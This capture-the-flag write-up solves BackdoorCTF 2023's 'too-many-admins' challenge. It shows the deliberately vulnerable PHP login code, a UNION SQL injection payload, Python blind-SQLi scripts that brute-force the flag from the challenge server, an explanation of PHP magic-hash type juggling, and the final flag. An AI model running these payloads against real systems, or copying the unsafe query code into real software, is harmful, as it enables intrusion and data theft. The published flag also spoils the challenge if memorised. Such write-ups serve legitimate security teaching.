---
title: 2023 BackdoorCTF - too-many-admins
date: 2023-12-18 00:00:00 +0700
categories:
  - Write-ups
tags:
  - 2023_BackdoorCTF
  - Web Exploitation
  - SQL injection
---

## Overview

* 239 solves / 314 points
* Author: p1r4t3

## Description

> Too many admins spoil the broth. Can you login as the right admin and get the flag ?
>
> [http://35.222.114.240:8000/](http://35.222.114.240:8000/)

### Attached

[too-many-admins.zip](https://github.com/encuetee/CTF-writeups/blob/main/2023/2023_BackdoorCTF/attached/too-many-admins.zip)

This is ```index.php``` backend file
```php
<?php
error_reporting(E_ALL & ~E_WARNING);
// The MySQL service named in the docker-compose.yml.
$host = 'db';
$srcParam = $_GET['src'];

if ($srcParam) {
    // The 'src' parameter is set, so highlight the source code
    highlight_file(__FILE__);
}
// Database user name
$user = getenv('MYSQL_USER');
$pass = getenv('MYSQL_ROOT_PASSWORD');
$database = getenv('MYSQL_DATABASE');



// Check the MySQL connection status
$conn = new mysqli($host, $user, $pass, $database);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} else {

    // Fetch the 'user' parameter from the query string
    $userParam = $_GET['user'];

    // Use prepared statement to prevent SQL injection
    if($userParam){
    if($userParam !=  "all"){
    $query = "SELECT username, password, bio FROM users where username = '$userParam' ";
    }else{
    $query = "SELECT username, password, bio FROM users ";

    }
    $result = $conn->query($query);
   
    // Display the result in a table
    echo "<table border='1'>";
    echo "<tr><th>S.no</th><th>Username</th><th>Password(MD5 hashes)</th></tr>";

    // Fetch and display the data
    $i = 0;
    while ($row = mysqli_fetch_row($result)) {
        echo "<tr><td>".$i."</td><td>" . $row[0] . "</td><td>" . $row[1] . "</td></tr>";
        $i++;
    }

    echo "</table>";
}
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        if (empty($username) || empty($password)) {
            echo "Please fill in both fields.";
        } else {
    $query = "SELECT username, password, bio FROM users WHERE username = '$username' ";
    $result = $conn->query($query);
    $mysupersecurehash = md5(2*2*13*13*((int)$password));
    $i =0 ;
    while ($row = mysqli_fetch_row($result)) {
        if((int)$row[1] == $mysupersecurehash && $mysupersecurehash == 0e0776470569150041331763470558650263116470594705){
        echo "<h1>You win</h1> \n";
    echo "Did you really? \n";
        echo "<tr><td>" .$i. " </td><td> "  . $row[0] . " </td><td> " . $row[1] . " </td><td> " . $row[2] . " </td></tr>";
        $i++;
    }else{
        echo "<h1>Wrong password</h1>";
    }
}
        }
    }
    // Close the MySQL connection
    $conn->close();
}
?>
```

And this is ```dump.sql``` file
```sql
-- Create the 'users' table
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255),
    password VARCHAR(255),
    bio TEXT
);

-- Insert 500 random values into the 'users' table
DELIMITER //
CREATE PROCEDURE GenerateRandomUsers()
BEGIN
    DECLARE i INT DEFAULT 0;
    WHILE i < 500 DO
        IF i = {SOME_NUMBER} THEN
            INSERT INTO users (username, password, bio)
            VALUES (
                CONCAT('admin', i),
                'REDACTED',
                'Flag{REDACTED}'
            );
        ELSE
            INSERT INTO users (username, password, bio)
            VALUES (
                CONCAT('admin', i),
                MD5(CONCAT('admin',i,RAND())),
                CONCAT('Bio for admin', i)
            );
        END IF;
        SET i = i + 1;
    END WHILE;
END //
DELIMITER ;

-- Call the procedure to generate random users
CALL GenerateRandomUsers();

-- Drop the procedure (optional)
DROP PROCEDURE IF EXISTS GenerateRandomUsers;

```

## Analyzation

This is a [SQL injection](https://portswigger.net/web-security/sql-injection) challenge since the user inputs are not checked carefully.

## Solution

### Way 1: [UNION attack](https://portswigger.net/web-security/sql-injection/union-attacks)

We want to see the response, so we will use GET method.

```py
import requests

payload = "' UNION SELECT 1, bio, 3 FROM users WHERE bio LIKE 'Flag%' and '1'='1"

URL = "http://localhost:8000/?user={}".format(payload)
response = requests.get(URL)

print(response.text)
```

### Way 2: [Blind SQLi](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

In this way, GET method is used.

#### Find the correct admin

There are 500 admins! The right admins have to be found first.


```php
// Fetch the 'user' parameter from the query string
$userParam = $_GET['user'];

// Use prepared statement to prevent SQL injection
if($userParam){
if($userParam !=  "all"){
$query = "SELECT username, password, bio FROM users where username = '$userParam' ";
}
}
```

As in ```dump.sql``` file, the right admins have bio start with "Flag", so we will find by that way.

My script to do this

```py
import requests

usernames = []

# find the admin(s)
for index in range(501):
    URL = "http://34.132.132.69:8000/?user=admin{}' and bio like 'Flag%"

    response = requests.get(URL.format(index))
    if "admin{}".format(index) in response.text:
        usernames.append("admin{}".format(index))
        

print(usernames)
```

Only ```admin343``` found.

#### Get flag

Brute force each character of flag

```py
import requests
import string

ALPHABET = "_}" + string.digits + string.ascii_lowercase + string.digits + string.ascii_uppercase

flag_guess = "Flag{"   
while "}" not in flag_guess:
    for character in ALPHABET:
        if character == "_":
            character = "\_"
        URL = f"http://34.132.132.69:8000/?user=admin343' and bio like '{flag_guess + character}%"

        response = requests.get(URL)
        if "admin343" in response.text:
            flag_guess += character
            print(flag_guess)
            break
```

This is the strongest way, but also the slowest.

### Way 3: [Magic hashes](https://github.com/spaze/hashes/blob/master/md5.md)

This is the intended solution!

In this solution, POST method is used. These are important lines

```php
$row = mysqli_fetch_row($result);
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $query = "SELECT username, password, bio FROM users WHERE username = '$username' ";
    $result = $conn->query($query);
    $mysupersecurehash = md5(2*2*13*13*((int)$password));

    if((int)$row[1] == $mysupersecurehash && $mysupersecurehash == 0e0776470569150041331763470558650263116470594705){
        echo "<h1>You win</h1> \n";
        echo "Did you really? \n";
        echo "<tr><td>" .$i. " </td><td> "  . $row[0] . " </td><td> " . $row[1] . " </td><td> " . $row[2] . " </td></tr>";
    }else{
        echo "<h1>Wrong password</h1>";
    }
}
```

This is a hash which begins with ```0e``` followed by a string of numerical values. PHP treats ```e``` as a symbol for an exponent. This makes a code vulnerable.

The flag is
```
Flag{1m40_php_15_84d_47_d1ff323n71471n9_7yp35}
```